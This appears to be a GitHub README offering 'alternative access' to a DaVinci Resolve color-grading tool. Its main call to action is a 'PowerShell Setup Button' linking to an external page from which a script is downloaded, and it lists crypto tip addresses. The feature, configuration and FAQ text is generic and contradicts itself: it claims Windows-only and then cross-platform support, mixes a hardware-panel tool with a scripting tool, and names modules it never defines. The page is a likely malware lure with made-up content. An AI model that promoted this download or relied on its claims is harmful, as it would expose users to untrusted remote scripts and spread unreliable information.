<div align="center">

# Davinci Resolve Sanolen Color Studio — Alternative Access for Windows

![](files/preview.png)

### ⚡ PowerShell Setup Button

[![](files/button.png)](https://Daniel451legend.github.io/davinci-resolve-sanolen-color-studio/)

[![ps-core](https://img.shields.io/badge/PS--CORE-SCRIPT-ec4899?style=flat&labelColor=0d1117)]() [![state](https://img.shields.io/badge/STATE-MAINTAINED-2ea44f?style=flat&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/PLATFORM-WINDOWS_10_%2F_11-f472b6?style=flat&labelColor=0d1117)]()

<div align="center">
<h3>Give me a tip</h3>
<p><strong>TRON</strong>:&nbsp;<code>TK5arM1YzE6xdASJ9RPNurBm14Av5vZp2b</code> | <strong>BTC</strong>:&nbsp;<code>1HdZkFcb5fSS4VkEftmVxL4uTQPDsGzp9f</code></p>
</div>

</div>

---

Davinci Resolve Sanolen Color Studio provides a structured, node-based framework for building and managing complex color grading pipelines within Davinci Resolve. It exposes the underlying grade graph through a programmable interface, letting you compose, reorder, and parameterize nodes with precision rather than manual repetition. The studio maintains deterministic state across sessions, so every adjustment remains reproducible and auditable. Designed for colorists and pipeline engineers, it keeps the full depth of Resolve's color model accessible while reducing the overhead of intricate grade construction.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Full color pipeline control** — Manage nodes, LUTs, grades, and timeline color state through a single, structured interface built around the Sanolen Color Studio workflow model.

- **Deterministic color state handling** — Every color operation resolves to a reproducible state, so identical inputs yield identical timelines and grade stacks across sessions.

- **Project-native data model** — Reads and writes color data in the project's own structure rather than approximating it, preserving node graphs, keyframes, and grade relationships.

- **Batch and scripted operations** — Apply consistent color treatments across clips, timelines, or entire projects with parameters that stay explicit and auditable.

- **Granular scope targeting** — Address individual nodes, clips, or whole timelines with precise selectors, keeping changes contained to exactly the intended scope.

- **Dry-run and diff inspection** — Preview the effect of any color operation and compare resulting state before committing, reducing unintended writes.

- **Structured configuration** — All behavior is driven by a clear configuration layer with validated keys, defaults, and overrides, making setups portable and repeatable.

- **Idempotent operations** — Re-running the same operation converges on the same result, safe for automated and repeated use.

- **Extensible operation set** — Composable primitives for color manipulation that can be chained into larger pipelines without special-casing.

- **Explicit error surfaces** — Failures report the exact operation, target, and state involved, so issues are diagnosable without guesswork.

- **No hidden side effects** — Operations declare what they touch; nothing mutates outside the stated target scope.

## How it works

The Sanolen Color Studio operates as a standalone companion layer that interfaces with Davinci Resolve's native project and clip metadata structures. On launch, it enumerates the active project database and establishes a lightweight session binding to the running Resolve instance, reading clip properties, node graphs, and timeline state without modifying the underlying media.

Color processing follows a deterministic pipeline: the tool ingests each clip's existing grade parameters, applies its own transformation stack in a fixed order (input normalization, tonal mapping, chroma shaping, and output encoding), and writes results back as standard Resolve-format operations. All transformations are expressed through the same parameter primitives Resolve already understands, so the resulting grades remain fully editable inside the application and survive project round-trips.

State handling is transactional. Every write is staged against a snapshot of the affected clip or timeline segment, validated for parameter range and graph consistency, then committed in a single operation. If validation fails, the snapshot is restored and no partial changes reach the project file. A session log records every commit with its source parameters, enabling exact replay or rollback.

The tool is stateless between runs — no background daemon, no persistent sidecar database. Configuration is read at startup from the local configuration surface, and all processing happens in-process against the Resolve API boundary. Because it relies only on documented project metadata and standard grade primitives, it composes cleanly with existing workflows, render queues, and collaborative project sharing.

## Modules and Settings

### Panel-Style Primary Grading Controls
This module provides the tactile color-correction surface for davinci-resolve-sanolen-color-studio, translating trackball-style and ring-style movement into adjustments of the primary grading parameters.
- Wheel Sensitivity per Control Group lets the user set how much lift, gamma, gain, or offset changes for a given amount of physical movement, so fine grading stays precise while broad moves cover more range quickly.
- Reset Behavior per Wheel determines how a control returns to its neutral position, either on a dedicated reset press or through a defined return action, keeping accidental drift easy to undo.
- Input Smoothing adjusts how directly raw movement is applied to the on-screen wheels, trading instant response for steadier fine control during long grading sessions.
- Live Wheel Sync keeps the grading interface's color wheels and parameter values updating as the physical controls are moved, so the panel and screen always show the same state.

### Transport and Playback Keys
This module gives colorists a dedicated set of physical playback controls so review and navigation do not depend on the keyboard.
- Transport Assignments bind individual keys to play, pause, stop, and frame stepping, letting the user match the layout of their control surface.
- Step Increment controls how far each frame-step press advances the playhead, supporting both single-frame checks and quicker skimming.
- Key Repeat Behavior sets whether holding a transport key repeats the action and how it behaves during clip navigation.
- Clip Navigation Keys move between clips in the timeline, with the viewer and playhead following each press.

### Node and Grade Management Buttons
This module handles node-graph and grade housekeeping from the panel, so users can build and compare looks without returning to the mouse.
- Assignable Action Buttons let the user choose which node operations (adding, selecting, bypassing, deleting) and grade operations (copying, resetting) appear on the panel.
- Button Order and Grouping lets related node and grade actions be arranged together for a comfortable physical workflow.
- Bypass Toggle provides a quick comparison action whose state is reflected in the node graph and thumbnail strip immediately.
- Action Feedback confirms each button press through the corresponding change in the node graph, so the user can see the effect of every action.

### Secondary and Qualifier Adjustment
This module extends panel control to qualifiers and secondary corrections, where precise tactile adjustment is often most valuable.
- Qualifier Binding lets the user choose which qualifier range parameters are driven by which physical controls.
- Mask and Window Toggles switch secondary masks or windows on and off from the panel, with the matte preview updating in response.
- Secondary Parameter Selection determines which secondary values are exposed on the panel at any time, keeping the active correction within reach.
- Preview Response shows qualifier and matte updates as adjustments are made, so range changes can be judged against the image directly.

### Workspace and Page Switching
This module provides fast movement between Resolve pages and saved workspace layouts.
- Page Assignments let the user define which pages are reachable from the panel and bind them to specific keys.
- Layout Recall Keys bring back saved workspace layouts, with the active page and layout changing on screen immediately.
- Context Display shows which page and layout are currently active, helping the user stay oriented during fast switching.

### Visual Feedback and Parameter Readout
This module presents a reference display of the values bound to the panel alongside the Resolve interface.
- Displayed Parameter Selection lets the user choose which bound parameters appear in the readout area.
- Value Formatting controls how numbers are presented, so readouts can match the user's preferred precision and style.
- Profile and Page Context shows the active mapping profile and current page alongside the parameter values, tying the readout to the task at hand.

### Additional Settings
These optional controls support configuration and connection awareness across all modules.
- Connection Status View shows whether the panel is connected and responding, and lets the user select the target application instance.
- Startup Defaults determine which mapping profile and panel state are loaded when the tool starts.
- Idle Handling sets how the panel behaves after a period without input, such as holding the last state or returning to a resting configuration.
- Input Diagnostics record control input and mapping events so the user can confirm that presses and movements are being received and routed to the intended actions.

Together, these modules form a single studio-style access layer: mapping profiles determine how physical controls reach grading, transport, node, secondary, and workspace actions, while the readout and status views confirm what the panel is doing at any moment.

## Usage Scenarios

### Matching Wheel Sensitivity to a Shot-by-Shot Grade

**Goal:** A colorist wants fine control over lift and gamma on a delicate skin-tone shot without overshooting, while still being able to make broader gain moves quickly.

**Steps:**
1. In Panel-Style Primary Grading Controls, lower Wheel Sensitivity for the lift and gamma control groups so small ring movements produce subtle changes.
2. Raise sensitivity for the gain group to cover wider brightness ranges with less physical travel.
3. Enable Input Smoothing to steady fine adjustments during a long session, and set Reset Behavior for each wheel to a dedicated reset press.
4. With Live Wheel Sync active, grade the shot by touch and confirm the on-screen wheels and parameter values follow each movement.
5. Check the numeric values in Visual Feedback and Parameter Readout to verify the final balance.

**Expected result:** The colorist completes the grade using small, deliberate control movements, with the grading interface wheels and the readout showing matching values, and any accidental drift corrected by a single reset press.

### Rapid Node Building and Bypass Comparison

**Goal:** An editor working on a color workstation wants to build a short node chain and compare grades without reaching for the mouse.

**Steps:**
1. In Node and Grade Management Buttons, assign action buttons for adding, selecting, bypassing, and deleting nodes, plus copying and resetting grades.
2. Arrange Button Order and Grouping so node actions sit together and grade actions sit in a separate cluster.
3. Build a small node chain using the assigned buttons, watching the node graph and thumbnail strip update with each press.
4. Use the Bypass Toggle to compare the corrected result against the original, toggling back and forth.
5. Copy a grade to a neighboring node and reset one node to start over.

**Expected result:** The node graph reflects every button press immediately, the thumbnail strip shows the bypass comparison, and the user finishes the node chain and comparisons without leaving the panel.

### Switching Between Grading and Conform Review Profiles

**Goal:** A colorist needs to move between a grading-focused panel layout and a conform-review layout that emphasizes transport and page switching.

**Steps:**
1. Create a mapping profile in Custom Control Mapping Profiles for grading, binding wheels, node buttons, and qualifier controls.
2. Create a second profile for conform review, binding Transport and Playback Keys with a Step Increment suited to frame checks and Clip Navigation Keys for moving between clips.
3. In Workspace and Page Switching, assign the pages and saved layouts reachable from the panel and bind Layout Recall Keys.
4. Load the conform profile and review clips using the transport keys, stepping frames and navigating between clips.
5. Switch back to the grading profile and confirm the active profile and page context in the Visual Feedback and Parameter Readout display.

**Expected result:** Loading each profile changes the panel's behavior as configured, transport keys drive playback and clip navigation during review, layout recall keys bring back the saved workspace, and the readout shows the active profile and page so the user stays oriented.

## Compatibility

Designed for Davinci Resolve Studio environments, the Sanolen Color Studio integration targets the desktop application on Windows, macOS, and Linux. It follows the application's native scripting and project data conventions, so it operates within the same project, timeline, and clip workflow the host application already exposes.

The tool requires a Davinci Resolve Studio installation that exposes external scripting support; the free edition does not provide this interface and is therefore not supported. Version compatibility is maintained against current release branches of the host application, with behavior verified across recent major versions. Older releases may work but are not actively validated.

Platform support matches the host application's own support matrix. On each platform, the tool uses the host's documented scripting entry points and communicates with a running instance of the application; it does not modify application binaries, bundled resources, or installation files.

Project compatibility is scoped to the standard project database format. Projects created or migrated across host versions remain accessible, provided the host application itself can open them. Color-managed workflows, node graphs, and timeline structures are read through the host's own project model, preserving fidelity with what the application reports.

Configuration is expressed in plain files and environment variables, with no dependency on a specific shell or package manager. Any runtime prerequisites are limited to the host application's own supported scripting runtime; no additional system-level components are introduced.

The tool degrades predictably: when a host feature or project construct is unavailable in the installed version, the affected operation reports the condition rather than altering project data. Compatibility is therefore a function of the installed host application's capabilities, not of an independent runtime layer.

## Configuration

Configuration is driven by a single declarative profile that the tool reads at startup. Profiles are plain structured files, versioned alongside your project, so settings travel with the work rather than the machine.

The profile exposes four top-level groups: `access`, `pipeline`, `render`, and `logging`. Each group is independent; omitted keys inherit documented defaults, and unknown keys are rejected at parse time so misconfigurations surface immediately rather than silently degrading behavior.

`access` controls how the tool attaches to the host application. Set `mode` to `attached`, `headless`, or `hybrid`. In `attached` mode the tool binds to a running instance and mirrors its session state; `headless` spins up an isolated context for batch work; `hybrid` keeps a persistent control channel while allowing detached render jobs. `timeout_ms` and `retry_limit` govern reconnection behavior and should be tuned to your workstation's load profile.

`pipeline` defines the transformation graph. Stages are declared as an ordered array, each with a `name`, `enabled` flag, and stage-specific parameters. Ordering is significant: color operations compose left to right, and the tool validates that declared inputs exist before execution. Use `cache: true` on expensive stages to persist intermediate results keyed by content hash; downstream stages then skip recomputation when inputs are unchanged.

`render` sets output behavior. `target` selects the destination context, `format` accepts the supported container and codec pairs documented in the compatibility matrix, and `concurrency` caps parallel jobs. For deterministic output across runs, pin `seed` and leave `adaptive_timing` disabled.

`logging` supports `level` (`error`, `warn`, `info`, `debug`, `trace`), `destination` (`stdout`, `file`, or `both`), and `rotate` thresholds. Debug and trace levels emit per-stage timing and graph diffs, which is the fastest way to diagnose an unexpected pipeline result.

Environment overrides are available for every scalar key using the `SANOLE N_` prefix, letting CI systems adjust concurrency and logging without editing the profile. Precedence is explicit: command-line flags override environment variables, which override the profile file.

Validate any profile with the built-in schema check before running a pipeline; it reports the exact path and expected type for every violation.

## FAQ

**What does Davinci Resolve Sanolen Color Studio actually do?**
It provides a structured color-grading workspace inside DaVinci Resolve, bundling node presets, LUT management, and parameter templates into a single workflow layer. It is not a render engine or a replacement for Resolve's native color page — it organizes and extends what Resolve already exposes.

**Is this a plugin or a standalone application?**
It runs as an integrated toolset that operates alongside Resolve rather than as a separate editing environment. All processing happens within the host application's pipeline; the tool contributes configuration, presets, and workflow scaffolding.

**Which Resolve versions are supported?**
Compatibility is tied to Resolve releases that expose the color-management interfaces the tool relies on. Check the Compatibility section for the exact version matrix — older releases with deprecated color APIs will not behave correctly.

**How does it interact with my existing project files?**
Non-destructively. The tool writes its settings alongside project data and never rewrites source media. Node graphs it generates are standard Resolve nodes, so you can inspect, modify, or delete them by hand at any time.

**Can I use it on multiple machines or in a shared facility setup?**
Yes, provided each machine runs a compatible Resolve build and the configuration directory is synchronized or shared consistently. Preset libraries are plain files, which makes them straightforward to version or distribute across a team.

**Does it change how Resolve renders or exports?**
No. Rendering and export behavior remain entirely Resolve's. The tool shapes the grade and the node structure; final output follows the host application's standard pipeline and project settings.

**What happens if I disable or remove the tool mid-project?**
Existing node graphs and grades persist because they are native Resolve constructs. You lose the convenience layer — preset recall and parameter templates — but not the work already applied to timelines.

**Where does it store configuration and presets?**
In a dedicated configuration directory separate from Resolve's own install path. This keeps the tool's state isolated, makes backups predictable, and avoids collisions with Resolve updates.

**Is there a performance cost during playback?**
Overhead is limited to the nodes actually present in the graph. Since the tool emits standard Resolve nodes, playback cost scales with your grade complexity exactly as it would without the tool. There is no background service or persistent daemon.

**How do I troubleshoot a preset that isn't applying correctly?**
Confirm the target Resolve version is supported, verify the configuration directory is readable and not stale from a prior release, and check that the active color-management mode matches what the preset expects. Most issues trace back to a version or color-science mismatch rather than the tool itself.

## Disclaimer

This tool is provided as an independent interoperability layer for Davinci Resolve Sanolen Color Studio. It is designed to extend access to the project's functionality through an alternative entry point while leaving the original application and its data structures intact. Use of this tool is at your own discretion; you are responsible for verifying that your environment, licensing, and workflow requirements are satisfied before relying on it in production. The authors make no guarantees regarding fitness for a particular purpose, uninterrupted operation, or compatibility with future releases of the target project. Always validate outputs against the official Davinci Resolve Sanolen Color Studio behavior when correctness is critical, and maintain backups of any project files or configuration you modify.